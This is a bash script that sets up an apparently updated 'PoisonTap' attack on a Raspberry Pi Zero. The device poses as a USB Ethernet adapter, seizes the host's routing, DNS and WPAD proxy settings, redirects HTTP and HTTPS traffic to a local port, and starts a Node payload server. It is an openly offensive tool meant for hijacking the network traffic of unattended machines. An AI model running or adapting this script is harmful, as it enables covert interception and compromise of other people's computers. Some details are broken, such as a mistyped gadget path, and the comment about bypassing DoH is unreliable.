#!/bin/bash
set -euo pipefail
# PoisonTap 2026 | Optimized for RPi Zero 2 W + Modern OS Network Stacks

UDC="/sys/class/udc"
CONFIG="/sys/kernel/config/usb_gadget/poison"
WLAN_IF="usb0"
SUBNET="1.0.0.0/8"
GATEWAY="1.0.0.1"
DNS_PORT=5353

# Clean old gadget
if [ -d "$CONFIG" ]; then
    ls "$UDC" > "$CONFIG/UDC" 2>/dev/null || true
    rm -rf "$CONFIG"
fi

mkdir -p "$CONFIG"
cd "$CONFIG"

# USB Descriptors (CDC-ECM compatible with Windows/macOS/Linux/Android/iOS)
echo 0x1d6b > idVendor
echo 0x0104 > idProduct
echo 0x0100 > bcdDevice
echo 0x0200 > bcdUSB
mkdir -p strings/0x409
echo "PT2026_$(date +%s)" > strings/0x409/serialnumber
echo "PoisonTap" > strings/0/409/manufacturer
echo "USB Ethernet Adapter" > strings/0x409/product

mkdir -p configs/c.1/strings/0x409
echo "CDC Ethernet (Internet)" > configs/c.1/strings/0x409/configuration
echo 250 > configs/c.1/MaxPower

mkdir -p functions/ecm.usb0
echo "42:61:64:55:53:42" > functions/ecm.usb0/dev_addr
echo "48:6f:73:74:50:43" > functions/ecm.usb0/host_addr
ln -s functions/ecm.usb0 configs/c.1/
ls "$UDC" > UDC

# Network Stack
ip link set "$WLAN_IF" up
ip addr add "$GATEWAY"/8 dev "$WLAN_IF"
sysctl -w net.ipv4.ip_forward=1
sysctl -w net.ipv6.conf.all.forwarding=0  # Force IPv4 fallback for DoH bypass

# nftables NAT
nft flush ruleset 2>/dev/null
nft add table inet poison
nft add chain inet poison prerouting '{ type nat hook prerouting priority -100; }'
nft add rule inet poison prerouting iifname "$WLAN_IF" tcp dport 80 redirect to 1337
nft add rule inet poison prerouting iifname "$WLAN_IF" tcp dport 443 redirect to 1337
nft add rule inet poison prerouting iifname "$WLAN_IF" udp dport 53 redirect to $DNS_PORT

# dnsmasq (replaces dnsspoof, supports dynamic zone updates)
dnsmasq --interface="$WLAN_IF" \
        --dhcp-range=1.0.0.2,1.0.0.250,12h \
        --dhcp-option=option:dns-server,1.0.0.1 \
        --dhcp-option=option:route,0.0.0.0,0 \
        --dhcp-option=252,"http://1.0.0.1:1337/wpad" \
        --cache-size=0 \
        --bind-dynamic \
        --no-resolv \
        --server=8.8.8.8 \
        &

# LED feedback (Pi Zero 2 W ACT LED)
echo 0 > /sys/class/leds/led1/brightness 2>/dev/null || true

# Launch payload server
exec node --no-warnings --max-old-space-size=128 /opt/poisontap/pi_poisontap_2026.js
